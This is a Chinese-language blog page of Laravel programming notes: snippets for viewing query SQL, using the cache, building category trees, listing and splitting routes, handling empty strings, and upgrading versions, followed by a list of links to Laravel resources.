<h3 id="Laravel-ORM-SQL-语句查询"><a href="#Laravel-ORM-SQL-语句查询" class="headerlink" title="Laravel ORM SQL 语句查询"></a>Laravel ORM SQL 语句查询</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">在 app/Providers/AppServiceProvider 中的 boot 方法中新增以下代码：</span><br><span class="line"></span><br><span class="line">\Illuminate\Database\Query\Builder::macro(<span class="string">'sql'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    $bindings = $<span class="keyword">this</span>-&gt;getBindings();</span><br><span class="line">    $sql = str_replace(<span class="string">'?'</span>,<span class="string">'%s'</span>,$<span class="keyword">this</span>-&gt;toSql());</span><br><span class="line">    <span class="keyword">return</span> vsprintf($sql, $bindings);</span><br><span class="line">&#125;);</span><br><span class="line">\Illuminate\Database\Eloquent\Builder::macro(<span class="string">'sql'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ($<span class="keyword">this</span>-&gt;getQuery()-&gt;sql());</span><br><span class="line">&#125;);</span><br><span class="line">二、使用方式</span><br><span class="line"></span><br><span class="line">查询带参数的 SQL 语句可在 ORM 后调用方法</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确用法</span></span><br><span class="line">User::query()-&gt;where(<span class="string">'id'</span>, <span class="number">1</span>)-&gt;sql();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 错误用法</span></span><br><span class="line">User::query()-&gt;where(<span class="string">'id'</span>, <span class="number">1</span>)-&gt;get()-&gt;sql();</span><br><span class="line">User::query()-&gt;where(<span class="string">'id'</span>, <span class="number">1</span>)-&gt;first()-&gt;sql();</span><br><span class="line">https:<span class="comment">//learnku.com/articles/33484</span></span><br></pre></td></tr></table></figure>
<h3 id="cache"><a href="#cache" class="headerlink" title="cache"></a>cache</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">use Illuminate\Support\Facades\Cache;</span><br><span class="line"></span><br><span class="line">Cache::get(<span class="string">'xxx'</span>);</span><br><span class="line">app(<span class="string">'Illuminate\Contracts\Cache\Factory'</span>)-&gt;get(<span class="string">'xxx'</span>);</span><br><span class="line">app(<span class="string">'Illuminate\Cache\CacheManager'</span>)-&gt;get(<span class="string">'xxx'</span>);</span><br><span class="line">app(<span class="string">'cache'</span>)-&gt;get(<span class="string">'xxx'</span>);</span><br><span class="line">app()[<span class="string">'cache'</span>]-&gt;get(<span class="string">'xxx'</span>);</span><br><span class="line">cache(<span class="string">'xxx'</span>);</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">cache</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="built_in">arguments</span> = func_get_args();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (empty($<span class="built_in">arguments</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> app(<span class="string">'cache'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_string($<span class="built_in">arguments</span>[<span class="number">0</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> app(<span class="string">'cache'</span>)-&gt;get(...$<span class="built_in">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! is_array($<span class="built_in">arguments</span>[<span class="number">0</span>])) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(</span><br><span class="line">                <span class="string">'When setting a value in the cache, you must pass an array of key / value pairs.'</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! isset($<span class="built_in">arguments</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(</span><br><span class="line">                <span class="string">'You must specify an expiration time when setting a value in the cache.'</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> app(<span class="string">'cache'</span>)-&gt;put(key($<span class="built_in">arguments</span>[<span class="number">0</span>]), reset($<span class="built_in">arguments</span>[<span class="number">0</span>]), $<span class="built_in">arguments</span>[<span class="number">1</span>]);</span><br><span class="line">        https:<span class="comment">//learnku.com/articles/33628</span></span><br></pre></td></tr></table></figure>
<h3 id="Laravel-的请求是怎么到达控制器"><a href="#Laravel-的请求是怎么到达控制器" class="headerlink" title="Laravel 的请求是怎么到达控制器"></a>Laravel 的请求是怎么到达控制器</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="分类列表无限分类"><a href="#分类列表无限分类" class="headerlink" title="分类列表无限分类"></a>分类列表无限分类</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getTree</span>(<span class="params">$data,$pId,$level = <span class="number">0</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">static</span> $list = [];</span><br><span class="line">        foreach ($data <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">            <span class="comment">//第一次遍历,找到父节点为根节点的节点 也就是pid=0的节点</span></span><br><span class="line">            <span class="keyword">if</span> ($value[<span class="string">'parent_id'</span>] == $pId)&#123;</span><br><span class="line">                <span class="comment">//父节点为根节点的节点,级别为0，也就是第一级</span></span><br><span class="line">                $value[<span class="string">'level'</span>] = $level;</span><br><span class="line">                $value[<span class="string">'display_name'</span>] =$value[<span class="string">'displayname'</span>];</span><br><span class="line">                $value[<span class="string">'displayname'</span>] = str_repeat(<span class="string">'━━'</span>, $value[<span class="string">'level'</span>]).$value[<span class="string">'displayname'</span>];</span><br><span class="line"></span><br><span class="line">                <span class="comment">//把数组放到list中</span></span><br><span class="line">                $list[] = $value;</span><br><span class="line">                <span class="comment">//把这个节点从数组中移除,减少后续递归消耗</span></span><br><span class="line">                unset($data[$key]);</span><br><span class="line">                <span class="comment">//开始递归,查找父ID为该节点ID的节点,级别则为原级别+1</span></span><br><span class="line">                self::getTree($data, $value[<span class="string">'id'</span>], $level+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $list;</span><br><span class="line">    &#125;</span><br><span class="line">优雅的树形数据结构管理包,基于Closure Table模式设计. https:<span class="comment">//github.com/jiaxincui/closure-table</span></span><br></pre></td></tr></table></figure>
<h3 id="获取路由"><a href="#获取路由" class="headerlink" title="获取路由"></a>获取路由</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$routeCollection = \Route::getRoutes();</span><br><span class="line"></span><br><span class="line">foreach ($routeCollection <span class="keyword">as</span> $value) &#123;</span><br><span class="line">    $routes[] = [$value-&gt;getPath(),$value-&gt;methods()[<span class="number">0</span>], $value-&gt;getActionName()];</span><br><span class="line">&#125;</span><br><span class="line">Route::get(<span class="string">'routes'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $routeCollection = Route::getRoutes();</span><br><span class="line"></span><br><span class="line">    echo <span class="string">"&lt;table style='width:100%'&gt;"</span>;</span><br><span class="line">        echo <span class="string">"&lt;tr&gt;"</span>;</span><br><span class="line">            echo <span class="string">"&lt;td width='10%'&gt;&lt;h4&gt;HTTP Method&lt;/h4&gt;&lt;/td&gt;"</span>;</span><br><span class="line">            echo <span class="string">"&lt;td width='10%'&gt;&lt;h4&gt;Route&lt;/h4&gt;&lt;/td&gt;"</span>;</span><br><span class="line">            echo <span class="string">"&lt;td width='10%'&gt;&lt;h4&gt;Name&lt;/h4&gt;&lt;/td&gt;"</span>;</span><br><span class="line">            echo <span class="string">"&lt;td width='70%'&gt;&lt;h4&gt;Corresponding Action&lt;/h4&gt;&lt;/td&gt;"</span>;</span><br><span class="line">        echo <span class="string">"&lt;/tr&gt;"</span>;</span><br><span class="line">        foreach ($routeCollection <span class="keyword">as</span> $value) &#123;</span><br><span class="line">            echo <span class="string">"&lt;tr&gt;"</span>;<span class="comment">//sina/vendor/laravel/framework/src/Illuminate/Routing/Route.php:919</span></span><br><span class="line">                echo <span class="string">"&lt;td&gt;"</span> . $value-&gt;getMethods()[<span class="number">0</span>] . <span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">                echo <span class="string">"&lt;td&gt;"</span> . $value-&gt;getPath() . <span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">                echo <span class="string">"&lt;td&gt;"</span> . $value-&gt;getName() . <span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">                echo <span class="string">"&lt;td&gt;"</span> . $value-&gt;getActionName() . <span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">            echo <span class="string">"&lt;/tr&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    echo <span class="string">"&lt;/table&gt;"</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//stackoverflow.com/questions/18394891/how-to-get-a-list-of-registered-route-paths-in-laravel</span></span><br><span class="line">https:<span class="comment">//stackoverflow.com/questions/15955295/displaying-registered-routes-in-laravel</span></span><br><span class="line"></span><br><span class="line">php artisan route:list  sina/vendor/laravel/framework/src/Illuminate/Foundation/Console/RouteListCommand.php:<span class="number">14</span></span><br></pre></td></tr></table></figure>
<h3 id="自动将空字符串转为-null"><a href="#自动将空字符串转为-null" class="headerlink" title="自动将空字符串转为 null"></a>自动将空字符串转为 null</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">laravel 有一个 ConvertEmptyStringsToNull 中间件，自动将空字符串转为 <span class="literal">null</span>。</span><br><span class="line">在 App\Http\Kernel.php 中，注释了这个中间件就好了。</span><br><span class="line"> QueryException In Connection.php line <span class="number">664</span> :</span><br><span class="line"> SQLSTATE[<span class="number">23000</span>]: Integrity constraint violation: <span class="number">1048</span> Column <span class="string">'judge_group'</span> cannot be <span class="literal">null</span></span><br><span class="line"> </span><br><span class="line"> 打印下 Request 返回的数据，Laravel 有个中间件会把 <span class="string">' '</span> 转为 <span class="literal">null</span>。https:<span class="comment">//learnku.com/laravel/t/35052</span></span><br></pre></td></tr></table></figure>
<h3 id="Laravel-5-5-升级到-6-0"><a href="#Laravel-5-5-升级到-6-0" class="headerlink" title="Laravel 5.5 升级到 6.0"></a>Laravel 5.5 升级到 6.0</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用 phpredis 替代 predis</span><br><span class="line"></span><br><span class="line">Laravel 开始推荐使用 phpredis 来代替 predis。</span><br><span class="line"></span><br><span class="line">所以要记得先安装 phpredis, 然后在 config/app.php 中去掉 Redis 别名</span><br><span class="line">https:<span class="comment">//learnku.com/articles/35056</span></span><br></pre></td></tr></table></figure>
<h3 id="API-和-后台接口分离"><a href="#API-和-后台接口分离" class="headerlink" title="API 和 后台接口分离"></a>API 和 后台接口分离</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">发现路由数量变多后影响到了性能，这个时候需要区别不同服务器去加载不同的路由。</span><br><span class="line"></span><br><span class="line">如何去别不同的服务器区别环境，但是又要区别是生产环境。</span><br><span class="line">可以使用 app()-&gt;environment(); 方法实现，生产环境和测试环境的区别。</span><br><span class="line"></span><br><span class="line">查看代码后发现可以使用更多的方法。</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取或检查当前应用程序环境。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @return string|bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">environment</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 返回传递给函数的参数数量</span></span><br><span class="line">    <span class="keyword">if</span> (func_num_args() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果第一个参数是数组就去第一个，不是的话取全部的。</span></span><br><span class="line">        $patterns = is_array(func_get_arg(<span class="number">0</span>)) ? func_get_arg(<span class="number">0</span>) : func_get_args();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Str::is($patterns, $<span class="keyword">this</span>[<span class="string">'env'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $<span class="keyword">this</span>[<span class="string">'env'</span>];</span><br><span class="line">&#125;</span><br><span class="line">Str::is 函数判断给定的字符串是否匹配给定的模式。星号 * 可以用来表示通配符：</span><br><span class="line"></span><br><span class="line"># 判断在 API 环境</span><br><span class="line">app()-&gt;environment(<span class="string">"production.api"</span>);</span><br><span class="line"># 判断在 ADMIN 环境</span><br><span class="line">app()-&gt;environment(<span class="string">"production.admin"</span>);</span><br><span class="line"># 判断在所有环境</span><br><span class="line">app()-&gt;environment(<span class="string">"production.*"</span>);</span><br><span class="line">修改 RouteServiceProvider 文件</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Define the routes for the application.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">map</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 公共路由</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (app()-&gt;environment(<span class="string">'production.api'</span>)) &#123;</span><br><span class="line">        # production api 路由</span><br><span class="line">        $<span class="keyword">this</span>-&gt;mapApiRoutes();</span><br><span class="line">    &#125; elseif (app()-&gt;environment(<span class="string">'production.admin'</span>)) &#123;</span><br><span class="line">        # production admin 路由</span><br><span class="line">        $<span class="keyword">this</span>-&gt;mapAdminRoutes();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        # local testing stanging 环境下加载所有路由</span><br><span class="line">        $<span class="keyword">this</span>-&gt;mapApiRoutes();</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;mapAdminRoutes();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/35099</span></span><br></pre></td></tr></table></figure>
<h3 id="laravel路由分割"><a href="#laravel路由分割" class="headerlink" title="laravel路由分割"></a>laravel路由分割</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">Route::group([<span class="string">'middleware'</span> =&gt; [<span class="string">'web'</span>]], <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    Route::group([<span class="string">'prefix'</span> =&gt; <span class="string">'user'</span>, <span class="string">'namespace'</span> =&gt; <span class="string">'User'</span>], <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span> app_path(<span class="string">'Http/Routes/user.php'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    Route::group([<span class="string">'prefix'</span> =&gt; <span class="string">'admin'</span>, <span class="string">'namespace'</span> =&gt; <span class="string">'Admin'</span>], <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span> app_path(<span class="string">'Http/Routes/admin.php'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    Route::group([<span class="string">'prefix'</span> =&gt; <span class="string">'api'</span>, <span class="string">'namespace'</span> =&gt; <span class="string">'Home'</span>], <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span> app_path(<span class="string">'Http/Routes/homeapi.php'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">app/Providers/RouteServiceProvider.php 的 map 方法中可以如下定义：</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">map</span>(<span class="params">Router $router</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $router-&gt;group([<span class="string">'namespace'</span> =&gt; $<span class="keyword">this</span>-&gt;namespace], <span class="function"><span class="keyword">function</span> (<span class="params">$router</span>) </span>&#123;</span><br><span class="line">        <span class="comment">//require app_path('Http/routes.php');</span></span><br><span class="line">        foreach (glob(app_path(<span class="string">'Http//Routes'</span>) . <span class="string">'/*.php'</span>) <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;app-&gt;make(<span class="string">'App\\Http\\Routes\\'</span> . basename($file, <span class="string">'.php'</span>))-&gt;map($router);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/laravel/t/2484/the-best-way-to-split-routesphp-laravel-routing-file</span></span><br><span class="line">php artisan route:cache</span><br><span class="line"></span><br><span class="line">   public <span class="function"><span class="keyword">function</span> <span class="title">map</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;mapWebRoutes();</span><br><span class="line">        $<span class="keyword">this</span>-&gt;mapApiRoutes();</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">mapWebRoutes</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Route::group([</span><br><span class="line">            <span class="string">'middleware'</span> =&gt; <span class="string">'web'</span>,</span><br><span class="line">            <span class="string">'namespace'</span> =&gt; $<span class="keyword">this</span>-&gt;namespace,</span><br><span class="line">        ], <span class="function"><span class="keyword">function</span> (<span class="params">$router</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">require</span> base_path(<span class="string">'routes/web.php'</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">mapApiRoutes</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Route::group([</span><br><span class="line">            <span class="string">'middleware'</span> =&gt; [<span class="string">'api'</span>, <span class="string">'auth:api'</span>],</span><br><span class="line">            <span class="string">'namespace'</span> =&gt; $<span class="keyword">this</span>-&gt;namespace,</span><br><span class="line">            <span class="string">'prefix'</span> =&gt; <span class="string">'api'</span>,</span><br><span class="line">        ], <span class="function"><span class="keyword">function</span> (<span class="params">$router</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">require</span> base_path(<span class="string">'routes/api.php'</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">http:<span class="comment">//www.xiaot123.com/post/laravel_route</span></span><br><span class="line"></span><br><span class="line">按照URL</span><br><span class="line"><span class="keyword">if</span> (Str::is(<span class="string">'api.*'</span>, request()-&gt;server(<span class="string">'HTTP_HOST'</span>) ?? <span class="string">''</span>)) &#123;</span><br><span class="line">      $<span class="keyword">this</span>-&gt;mapApiRoutes();</span><br><span class="line">&#125; elseif (Str::is(<span class="string">'admin.*'</span>, request()-&gt;server(<span class="string">'HTTP_HOST'</span>) ?? <span class="string">''</span>)) &#123;</span><br><span class="line">      $<span class="keyword">this</span>-&gt;mapAdminRoutes();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      $<span class="keyword">this</span>-&gt;mapApiRoutes();</span><br><span class="line"></span><br><span class="line">      $<span class="keyword">this</span>-&gt;mapAdminRoutes();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/AlexStack/Laravel-CMS" target="_blank" rel="noopener">Laravel 项目的简单 CMS</a></p>
<p><a href="https://learnku.com/docs/the-laravel-way/5.6/Tao-1-1/2925" target="_blank" rel="noopener">Laravel 之道</a></p>
<p>Laravel 代码生成器 <a href="https://learnku.com/laravel/t/34772" target="_blank" rel="noopener">https://learnku.com/laravel/t/34772</a> <a href="https://github.com/GooGee/Entity-Builder" target="_blank" rel="noopener">https://github.com/GooGee/Entity-Builder</a></p>
<p><a href="https://github.com/yanlongma/docker-lnmp" target="_blank" rel="noopener">使用 Docker LNMP 部署 PHP 开发环境 </a></p>
<p><a href="https://learnku.com/laravel/t/34780" target="_blank" rel="noopener">PHP-fpm MongoDB 连接数 </a></p>
<p><a href="https://github.com/sheaxiang/shea" target="_blank" rel="noopener"> Laravel 源码写的一个简易框架</a></p>
<p><a href="https://learnku.com/articles/34628" target="_blank" rel="noopener">轻松部署 Laravel 应用 </a></p>
<p>接近免费的 SSL 证书 <a href="https://www.digital-sign.com.cn/register" target="_blank" rel="noopener">https://www.digital-sign.com.cn/register</a></p>
<p>一键生成 https 根域名证书更方便，推荐 certbot-auto 脚本</p>
<p><a href="https://github.com/mylxsw/wizard" target="_blank" rel="noopener">Laravel 的开源api文档管理系统 Wizard </a></p>
<p><a href="https://learnku.com/articles/34879" target="_blank" rel="noopener">CentOS7 轻松部署 Laravel 应用</a></p>
<p><a href="https://github.com/peinhu/aetherupload-laravel" target="_blank" rel="noopener">超大文件上传</a></p>
<p><a href="https://learnku.com/articles/34568" target="_blank" rel="noopener">使用 AetherUpload 视频上传过程</a></p>
<p><a href="https://github.com/kphcdr/axeadmin-laravel" target="_blank" rel="noopener">axeadmin 让你的 Laravel 快速拥有一个后台</a></p>
<p><a href="https://learnku.com/articles/34123" target="_blank" rel="noopener">Laravel 的请求是怎么到达控制器</a></p>
<p><a href="https://github.com/eleven26/listen-sql" target="_blank" rel="noopener">控制台实时查看 sql</a></p>
<p><a href="https://learnku.com/articles/33400" target="_blank" rel="noopener">HTTP 协议免费升级到 HTTPS</a></p>
<p><a href="https://github.com/wmhello/laravel_template_with_vue" target="_blank" rel="noopener"> Laravel-echo-server 开发聊天室和客服功能</a></p>
<p><a href="https://learnku.com/docs/the-laravel-way/5.6/Tao-1-1/2925" target="_blank" rel="noopener">laravel之道</a></p>
<p><a href="https://googee.github.io/Entity-Builder/dist/" target="_blank" rel="noopener">Laravel 代码生成工具</a></p>
<p><a href="https://learnku.com/articles/32007#replies" target="_blank" rel="noopener">Laravel 源码阅读 - Eloquent</a></p>
<p><a href="https://github.com/alexeymezenin/laravel-best-practices/blob/master/chinese.md" target="_blank" rel="noopener">laravel最佳实践</a></p>
<p><a href="https://github.com/sweida/laravel-blog-api/" target="_blank" rel="noopener">Laravel+vue 个人博客</a></p>
<p><a href="https://laravelacademy.org/laravel-from-appreciate-to-artisan" target="_blank" rel="noopener">Laravel 从学徒到工匠精校版 </a></p>
<p><a href="https://learnku.com/articles/32333" target="_blank" rel="noopener">服务容器</a></p>
<p><a href="https://github.com/immortalChensm/laravel5.8" target="_blank" rel="noopener">Laravel5.8 版本内核源码注解</a></p>
<p><a href="https://learnku.com/articles/32025" target="_blank" rel="noopener">Laravel-admin 源码分析系列</a></p>
<p><a href="https://learnku.com/articles/32007" target="_blank" rel="noopener">Laravel 源码阅读</a></p>
<p><a href="https://github.com/y-ui/laravel-data-masking" target="_blank" rel="noopener">Laravel 数据库脱敏工具</a></p>
<p><a href="https://github.com/xiaohuilam/laravel/wiki" target="_blank" rel="noopener">Laravel 深入浅出指南  </a></p>
<p><a href="https://github.com/immortalChensm/laravel-work" target="_blank" rel="noopener">Laravel5.5LTS 版本源码内核阅读注解</a></p>
<p><a href="https://leoyang90.gitbooks.io/laravel-source-analysis/content/" target="_blank" rel="noopener">laravel 源码详解https://github.com/LeoYang90/laravel-source-analysis</a></p>
<p><a href="https://github.com/shanyul/photosLive" target="_blank" rel="noopener">Laravel + Vue + Oss 搭建的图片墙</a></p>
<p><a href="https://github.com/tangtanglove/fullstack-backend" target="_blank" rel="noopener">基于 Laravel + Ant-design-pro 界面美观漂亮的后台</a></p>
<p><a href="https://learnku.com/articles/32025" target="_blank" rel="noopener">Laravel-admin 安装分析</a></p>
<p><a href="https://github.com/imnotdoubi/laravel-admin.git" target="_blank" rel="noopener">电子商务后台系统</a></p>
<p><a href="https://learnku.com/laravel/t/31585" target="_blank" rel="noopener">基于laravel的博客</a></p>
